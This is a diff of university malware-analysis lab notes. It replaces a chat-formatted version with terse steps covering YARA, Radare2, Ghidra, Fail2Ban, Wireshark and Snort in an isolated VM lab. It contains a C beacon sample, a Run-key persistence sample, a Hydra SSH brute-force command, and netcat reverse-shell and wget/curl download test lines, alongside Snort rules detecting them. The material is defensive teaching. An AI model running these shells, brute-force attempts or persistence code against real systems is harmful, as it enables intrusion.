@@ -1,424 +1,263 @@
-cs 1a.pdf
-PDF
-
-cs 1b.pdf
-PDF
-
-
-1a and 1b
-
-Here you go — Experiment 1(a) and 1(b) in proper lab format (clean + shortened code + exam-ready).
-
-✅ EXPERIMENT 1(a)
-📄 (Ref: )
-Procedure
-1. Open Kali Linux terminal.
-2. Update the system:  sudo apt update && sudo apt upgrade -y            
-3. Install YARA:  sudo apt install yara -y            
-4. Verify installation:  yara --version            
-5. Create a sample file:  echo "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" > sample.exe            
-6. Create YARA rule file:  nano eicar_rule.yar            
-7. Add the following rule:
-    * Detects EICAR test malware string
-8. Run YARA:  yara eicar_rule.yar sample.exe            
-9. Observe output.
-
-Code (YARA Rule)
-
-rule EICAR_Test_File
-{
-    strings:
-        $a = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" nocase
-        $b = "EICAR" nocase
-    condition:
-        any of them
-}
-
-
-✅ EXPERIMENT 1(b)
-📄 (Ref: )
-Procedure
-1. Open Kali Linux terminal.
-2. Update system (if not done):  sudo apt update && sudo apt upgrade -y            
-3. Install YARA:  sudo apt install yara -y            
-4. Copy a Windows binary:  cp /usr/share/windows-resources/binaries/nc.exe suspicious.bin            
-5. Verify file type:  file suspicious.bin            
-6. Create YARA rule file:  nano windows_rule.yar            
-7. Add generic malware detection rule.
-8. Insert suspicious strings:  echo "CreateRemoteThread" >> suspicious.bin
-9. echo "cmd.exe" >> suspicious.bin            
-10. Run YARA:  yara windows_rule.yar suspicious.bin            
-11. Observe output.
-
-Code (YARA Rule)
-
+1
+Ubuntu
+import platform, socket
+from datetime import datetime
+with open("sysinfo_log.txt", "a") as file:
+file.write("System Information\n")
+file.write(f"Date & Time: {datetime.now()}\n")
+file.write(f"System: {platform.system()}\n")
+file.write(f"Node Name: {platform.node()}\n")
+file.write(f"Release: {platform.release()}\n")
+file.write(f"Version: {platform.version()}\n")
+file.write(f"Machine: {platform.machine()}\n")
+file.write(f"Processor: {platform.processor()}\n")
+file.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
+file.write(“===============================\n\n")
+import time, socket
+from datetime import datetime
+server, port = "example.com", 80
+log_file = "network_activity.log"
+for i in range(5):
+try:
+socket.create_connection((server, port), timeout=3).close()
+result = "Connection successful"
+except:
+result = "Connection failed"
+with open(log_file, "a") as f:
+f.write(f"{datetime.now()} - Beacon attempt to {server}:{port} - {result}\n")
+time.sleep(5)
+2
+Kali, Yara
+cp /usr/share/windows-resources/binaries/nc.exe suspicious.bin
+chmod -x suspicious.bin
+file suspicious.bin
+vi windows_malware_generic.yar
 rule windows_malware_generic
 {
-    strings:
-        $a = "CreateRemoteThread" nocase
-        $b = "VirtualAllocEx" nocase
-        $c = "WriteProcessMemory" nocase
-        $d = "cmd.exe" nocase
-        $e = "CurrentVersion\\Run" nocase
-
-    condition:
-        uint16(0) == 0x5A4D and any of them
+strings:
+$api1 = "CreateRemoteThread"
+$api2 = "VirtualAllocEx"
+$api3 = "WriteProcessMemory"
+$cmd = "cmd.exe"
+$reg = "CurrentVersion\\Run"
+condition:
+uint16(0) == 0x5A4D and
+any of ($api*) or ($cmd or $reg)
 }
-
-
-If you want next: 👉 I can give output + result + conclusion (perfect exam lines) 👉 Or continue with Experiment 2 👍
-
-
-
-2
-
-Here’s EXPERIMENT 2 (Part A) in the exact format you want — clean, proper, and shortened.
-
-✅ EXPERIMENT 2 – Static Analysis using Radare2
-📄 (Ref: )
-Procedure
-1. Open Ubuntu terminal.
-2. Install required packages:  sudo apt update
-3. sudo apt install mingw-w64 wine            
-4. Create working directory:  mkdir malware_lab
-5. cd malware_lab            
-6. Create source file:  nano sample.c            
-7. Write the program (given below) and save.
-8. Compile Windows executable:  x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32            
-9. Verify file type:  file sample.exe            
-
-🔍 Radare2 Analysis
-1. Install Radare2:  sudo apt install snapd
-2. sudo snap install radare2 --classic            
-3. Open file in Radare2:  r2 sample.exe            
-4. Perform analysis:
-
-i        → file info
-iz       → extract strings
-ii       → imports
-aaa      → full analysis
-afl      → functions list
-ii~connect → filter network APIs
-
-1. Identify:
-* Suspicious strings (IP, messages)
-* Network-related APIs
-* Program behavior
-
-Code (Shortened)
-
+echo "CreateRemoteThread" >> suspicious.bin
+echo "cmd.exe" >> suspicious.bin
+echo "VirtualAllocEx" >> suspicious.bin
+yara windows_malware_generic.yar suspicious.bin
+3
+Ubuntu, Radare
+sudo apt install mingw-w64 wine
+vi sample.c
 #include <winsock2.h>
 #include <windows.h>
-
 int main() {
-    WSADATA w;
-    SOCKET s;
-    struct sockaddr_in server;
-    char msg[] = "beacon:system_online";
-
-    WSAStartup(MAKEWORD(2,2), &w);
-    s = socket(AF_INET, SOCK_STREAM, 0);
-
-    server.sin_addr.s_addr = inet_addr("192.168.56.101");
-    server.sin_family = AF_INET;
-    server.sin_port = htons(4444);
-
-    connect(s, (struct sockaddr*)&server, sizeof(server));
-    send(s, msg, sizeof(msg), 0);
-
-    closesocket(s);
-    WSACleanup();
-    return 0;
+WSADATA wsa;
+SOCKET sock;
+struct sockaddr_in server;
+char message[] = "beacon:system_online";
+WSAStartup(MAKEWORD(2,2), &wsa);
+sock = socket(AF_INET, SOCK_STREAM, 0);
+server.sin_addr.s_addr = inet_addr("192.168.56.101");
+server.sin_family = AF_INET;
+server.sin_port = htons(4444);
+connect(sock, (struct sockaddr *)&server, sizeof(server));
+send(sock, message, sizeof(message), 0);
+closesocket(sock);
+WSACleanup();
+return 0;
 }
-
-
-If you want next: 👉 I can give Result + Conclusion (perfect scoring lines) 👉 Or continue with Experiment 3
-
-
-
-3
-
-Here’s EXPERIMENT 3 in proper lab format (clean, shortened, exam-ready).
-
-✅ EXPERIMENT 3 – Disassembly using Ghidra
-📄 (Ref: )
-Procedure
-1. Open Kali Linux terminal.
-2. Install MinGW:  sudo apt update
-3. sudo apt install mingw-w64            
-4. Create working directory:  mkdir ghidra_lab
-5. cd ghidra_lab            
-6. Create source file:  nano sample.c            
-7. Write the program (given below) and save.
-8. Compile executable:  x86_64-w64-mingw32-gcc sample.c -o sample.exe            
-9. Verify file:  file sample.exe            
-
-🔍 Ghidra Analysis
-1. Install Ghidra:  sudo apt install openjdk-21-jdk
-2. sudo apt install ghidra            
-3. Launch:  ghidra            
-4. Create project:
-* File → New Project → Non-Shared
-* Import sample.exe
-1. Analyze file:
-* Click Analyze → Default options
-1. Inspect:
-* Symbol Tree → Imports
-* Defined Strings
-* Decompiler Window
-* Listing (Assembly)
-1. Identify:
-* File creation APIs
-* Registry persistence
-* Suspicious behavior
-
-Code (Shortened)
-
-#include <windows.h>
-#include <stdio.h>
-
-int main() {
-    HANDLE f;
-    HKEY k;
-    DWORD bw;
-    char data[] = "System initialized\n";
-
-    f = CreateFileA("C:\\Temp\\syslog.txt", GENERIC_WRITE, 0, NULL,
-                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-    WriteFile(f, data, sizeof(data), &bw, NULL);
-    CloseHandle(f);
-
-    RegCreateKeyExA(HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, NULL, 0, KEY_WRITE, NULL, &k, NULL);
-
-    RegSetValueExA(k, "SystemUpdater", 0, REG_SZ,
-        (BYTE*)"C:\\Temp\\sample.exe", 20);
-
-    RegCloseKey(k);
-
-    MessageBoxA(NULL, "Service Started", "System", MB_OK);
-    return 0;
-}
-
-
-If you want: 👉 I can give perfect Result + Conclusion (very important for marks) 👉 Or continue with Experiment 4
-
-
-
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+file sample.exe
+sudo apt install snapd
+sudo snap install radare2
+radare2.r2 sample.exe # Open binary
+i # Basic file information
+ij # Detailed metadata
+iz # List strings
+izz~beacon # Search for "beacon" string
+ii # List imported APIs
+ii~WSA # Search Winsock APIs
+ii~connect # Search connect API
+ii~send # Search send API
+ie # Show entry point
+aaa # Perform full analysis
+afl # List functions
+iiR # Check embedded resources
+izz~http # Search URLs
+izz~cmd # Search command strings
+izz~powershell # Search PowerShell strings
+izz~exe # Search executable references
 4
-
-Here’s EXPERIMENT 4 in proper format (clean, stepwise, exam-ready).
-
-✅ EXPERIMENT 4 – Brute Force Protection using Fail2Ban
-📄 (Ref: )
-Procedure
-1. Open Ubuntu terminal and get root access:  sudo su            
-2. Install Fail2Ban:  sudo apt install fail2ban -y            
-3. Check SSH service:  systemctl status ssh            
-4. Copy configuration file:  cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local            
-5. Edit configuration:  nano /etc/fail2ban/jail.local            
-6. Modify SSH settings:  [sshd]
-7. enabled = true
-8. port = ssh
-9. maxretry = 3
-10. findtime = 600
-11. bantime = 600            
-12. Restart Fail2Ban:  systemctl restart fail2ban            
-
-🔍 Simulating Attack (Kali Linux)
-1. Go to wordlist directory:  cd /usr/share/wordlists            
-2. Unzip wordlist:  gunzip rockyou.txt.gz            
-3. Perform brute-force attack:
-
-hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://<ubuntu_ip>
-
-
-🔍 Verification (Ubuntu)
-1. Check banned IP:
-
-fail2ban-client status sshd
-
-1. View logs:
-
-tail -f /var/log/auth.log
-
-1. Unban IP:
-
-fail2ban-client set sshd unbanip <kali_ip>
-
-
-Code / Configuration
-
+Kali, Ghidra
+sudo apt install mingw-w64
+vi sample.c
+#include <windows.h>
+int main() {
+HKEY hKey;
+HANDLE hFile;
+DWORD bw;
+char data[] = "System Initialized\n";
+hFile = CreateFileA("C:\\Temp\\syslog.txt",
+GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
+FILE_ATTRIBUTE_HIDDEN,NULL);
+WriteFile(hFile,data,sizeof(data),&bw,NULL);
+CloseHandle(hFile);
+RegCreateKeyExA(HKEY_CURRENT_USER,
+"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+RegSetValueExA(hKey,"SystemUpdater",0,REG_SZ,
+(BYTE*)"C:\\Temp\\sample.exe",20);
+RegCloseKey(hKey);
+MessageBoxA(NULL,"Service Started","System",MB_OK);
+return 0;
+}
+x86_64-w64-mingw32-gcc sample.c -o sample.exe
+file sample.exe
+ghidra
+Project Creation
+File → New Project → Non-Shared Project
+File → Import File → sample.exe
+Analyze → Analyze
+Open the following windows:
+Window → Symbol Tree
+Window → Defined Strings
+Window → Decompiler
+Window → Listing
+Symbol Tree (Imports)
+CreateFileA - Creates a file
+WriteFile - Writes data to a file
+CloseHandle - Closes file handle
+RegCreateKeyExA - Creates registry key
+RegSetValueExA - Sets registry value (persistence)
+MessageBoxA - Displays message box
+Defined Strings
+System Initialized
+C:\Temp\syslog.txt
+Software\Microsoft\Windows\CurrentVersion\Run
+SystemUpdater
+C:\Temp\sample.exe
+Service Started
+System
+Decompiler View
+CreateFileA(...)
+WriteFile(...)
+RegCreateKeyExA(...)
+RegSetValueExA(...)
+MessageBoxA(...)
+Listing View
+CALL CreateFileA
+CALL WriteFile
+CALL RegCreateKeyExA
+CALL RegSetValueExA
+CALL MessageBoxA
+5
+Ubuntu & Kali, Fail2Ban
+Ubuntu
+sudo su
+sudo apt install fail2ban
+sudo systemctl status ssh
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+sudo nano /etc/fail2ban/jail.local
 [sshd]
 enabled = true
 port = ssh
 maxretry = 3
 findtime = 600
 bantime = 600
-
-
-If you want next: 👉 I can give Result + Conclusion (perfect scoring lines) 👉 Or continue with Experiment 5
-
-
-
-5
-
-Here’s EXPERIMENT 5 in proper lab format (clean, stepwise, shortened code).
-
-✅ EXPERIMENT 5 – Malware Traffic Analysis using Wireshark
-📄 (Ref: )
-Procedure
-Part A: Create Malware Sample (Ubuntu)
-1. Open Ubuntu terminal.
-2. Install required packages:  sudo apt update
-3. sudo apt install mingw-w64 wine            
-4. Create directory:  mkdir malware_lab
-5. cd malware_lab            
-6. Create source file:  nano sample.c            
-7. Write program (given below) and save.
-8. Compile executable:  x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32            
-9. Verify:  file sample.exe            
-
-Part B: Setup C2 Server (Metasploitable)
-1. Check IP:  ifconfig            
-2. Start listener:  nc -lvnp 4444            
-
-Part C: Capture Traffic (Kali Linux)
-1. Start Wireshark:
-
-wireshark
-
-1. Select network interface and start capture.
-
-Part D: Execute Malware (Ubuntu)
-1. Run executable:
-
-wine sample.exe
-
-
-Part E: Analyze Traffic (Kali)
-1. Stop capture and save file.
-2. Apply filters:
-
-tcp
-ip.addr == <C2_IP>
-tcp.port == 4444
-
-1. Inspect packets:
-* Right click → Follow → TCP Stream
-* Observe payload
-
-Code (Shortened)
-
+sudo systemctl restart fail2ban
+Kali
+cd /usr/share/wordlists
+gunzip rockyou.txt.gz
+hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_IP>
+Ubuntu
+sudo fail2ban-client status sshd
+Output: Banned IP list: <KALI_IP>
+unban the ip
+sudo fail2ban-client set sshd unbanip <KALI_IP>
+6
+Ubuntu & Metasp & Kali, wireshark
+sudo apt install mingw-w64 wine
+vi sample.c
 #include <winsock2.h>
 #include <windows.h>
-
 int main() {
-    WSADATA w;
-    SOCKET s;
-    struct sockaddr_in server;
-    char msg[] = "beacon:system_online";
-
-    WSAStartup(MAKEWORD(2,2), &w);
-    s = socket(AF_INET, SOCK_STREAM, 0);
-
-    server.sin_addr.s_addr = inet_addr("192.168.56.101");
-    server.sin_family = AF_INET;
-    server.sin_port = htons(4444);
-
-    connect(s, (struct sockaddr*)&server, sizeof(server));
-    send(s, msg, sizeof(msg), 0);
-
-    closesocket(s);
-    WSACleanup();
-    return 0;
+WSADATA wsa;
+SOCKET sock;
+struct sockaddr_in server;
+char message[] = "beacon:system_online";
+WSAStartup(MAKEWORD(2,2), &wsa);
+sock = socket(AF_INET, SOCK_STREAM, 0);
+server.sin_addr.s_addr = inet_addr("192.168.56.101");
+server.sin_family = AF_INET;
+server.sin_port = htons(4444);
+connect(sock, (struct sockaddr *)&server, sizeof(server));
+send(sock, message, sizeof(message), 0);
+closesocket(sock);
+WSACleanup();
+return 0;
 }
-
-
-If you want: 👉 I can give Result + Conclusion (very important for marks) 👉 Or continue with Experiment 6
-
-
-
-6
-
-Here’s EXPERIMENT 6 in proper format (clean, stepwise, exam-ready).
-
-✅ EXPERIMENT 6 – Malware Detection using Snort IDS
-📄 (Ref: )
-Procedure
-Step 1: Network Setup
-1. Set all VMs to Host-only network.
-2. Check IP addresses:  ifconfig            
-3. Verify connectivity:  ping <kali_ip>            
-
-Step 2: Install Snort (Ubuntu)
-1. Install Snort:  sudo apt update
-2. sudo apt install snort -y            
-3. Check version:  snort -V            
-
-Step 3: Configure Snort
-1. Open config file:  sudo nano /etc/snort/snort.conf            
-2. Set HOME_NET:  ipvar HOME_NET 192.168.45.0/24            
-
-Step 4: Add Detection Rules
-1. Edit rules file:  sudo nano /etc/snort/rules/local.rules            
-2. Add malware detection rules (given below).
-
-Step 5: Test Configuration
-1. Validate:
-
-sudo snort -T -c /etc/snort/snort.conf
-
-
-Step 6: Run Snort
-1. Find interface:
-
-ip link
-
-1. Start IDS:
-
-sudo snort -A console -q -c /etc/snort/snort.conf -i <interface>
-
-
-Step 7: Generate Traffic (Kali / Metasploitable)
-1. Reverse shell test:
-
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+file sample.exe
+Metasp
 nc -lvnp 4444
-nc <kali_ip> 4444 -e /bin/bash
-
-1. Other tests:
-
-echo "nc test" | nc <kali_ip> 1234
-echo "/bin/bash" | nc <kali_ip> 1234
-wget http://<kali_ip>/malware.exe
-curl http://<kali_ip>/malware.exe
-
-
-Step 8: View Alerts
-1. Check logs:
-
-sudo cat /var/log/snort/alert
-
-1. Monitor live:
-
-sudo tail -f /var/log/snort/alert
-
-
-Code (Snort Rules)
-
-alert tcp any any -> $HOME_NET 4444 (msg:"Reverse Shell Detected"; sid:1000001;)
-
-alert tcp any any -> $HOME_NET any (msg:"Netcat Detected"; content:"nc "; nocase; sid:1000002;)
-
-alert tcp any any -> $HOME_NET any (msg:"Bash Execution"; content:"/bin/bash"; nocase; sid:1000003;)
-
-alert tcp any any -> $HOME_NET any (msg:"Wget Download"; content:"wget"; nocase; sid:1000004;)
-
-alert tcp any any -> $HOME_NET any (msg:"Curl Download"; content:"curl"; nocase; sid:1000005;)
-
-alert tcp any any -> $HOME_NET 80 (msg:"EXE Download"; content:".exe"; sid:1000006;)
-
-alert tcp any any -> $HOME_NET any (msg:"Meterpreter Detected"; content:"meterpreter"; nocase; sid:1000007;)
-
-alert tcp any any -> $HOME_NET 6667 (msg:"IRC Botnet Traffic"; sid:1000008;)
+Kali
+Launch Wireshark
+Ubuntu
+wine sample.exe
+Kali
+On Wireshark tcp.port == 4444
+Inspect Payload:
+Right Click Packet
+→ Follow
+→ TCP Stream
+Observed Payload:
+beacon:system_online
+7
+Ubuntu & Kali & Metasp, Snort
+Ubuntu
+snort -V
+sudo nano /etc/snort/snort.conf
+Set:
+ipvar HOME_NET 192.168.45.0/24
+sudo nano /etc/snort/rules/local.rules
+alert tcp any any -> $HOME_NET 4444 (msg:"MALWARE Reverse Shell Attempt Detected (Port
+4444)"; sid:3000001; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Netcat Keyword Detected"; content:"nc ";
+nocase; sid:3000002; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Bash Shell Execution Pattern Detected";
+content:"/bin/bash"; nocase; sid:3000003; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Downloader Command Detected (wget)";
+content:"wget"; nocase; sid:3000004; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Downloader Command Detected (curl)";
+content:"curl"; nocase; sid:3000005; rev:1;)
+alert tcp any any -> $HOME_NET 80 (msg:"MALWARE Possible EXE File Transfer Detected";
+flow:to_client,established; content:".exe"; sid:3000006; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Meterpreter Payload Detected";
+content:"meterpreter"; nocase; sid:3000007; rev:1;)
+alert tcp any any -> $HOME_NET 6667 (msg:"MALWARE Possible IRC Botnet Traﬃc";
+sid:3000008; rev:1;)
+sudo snort -T -c /etc/snort/snort.conf
+ip link
+sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
+Kali: nc -lvnp 4444 Metasploitable2: nc <KALI_IP> 4444 -e /bin/bash
+Kali: nc -lvnp 1234 Metasploitable2: echo "nc test" | nc <KALI_IP> 1234
+Kali: nc -lvnp 1234 Metasploitable2: echo "/bin/bash" | nc <KALI_IP> 1234
+Kali: echo "fake malware file" > malware.exe python3 -m http.server 80 Metasploitable2: wget
+http://<KALI_IP>/malware.exe
+Metasploitable2: curl http://<KALI_IP>/malware.exe
+Kali: nc -lvnp 1234 Metasploitable2: echo "meterpreter" | nc <KALI_IP> 1234
+Kali: nc -lvnp 6667 Metasploitable2: nc <KALI_IP> 6667
+View alerts in Ubuntu: sudo cat /var/log/snort/alert
+//
+Reverse Shell (4444)
+Netcat Keyword
+Bash Shell
+wget Downloader
+curl Downloader
+EXE Download
+Meterpreter Payload
+IRC Botnet (6667)
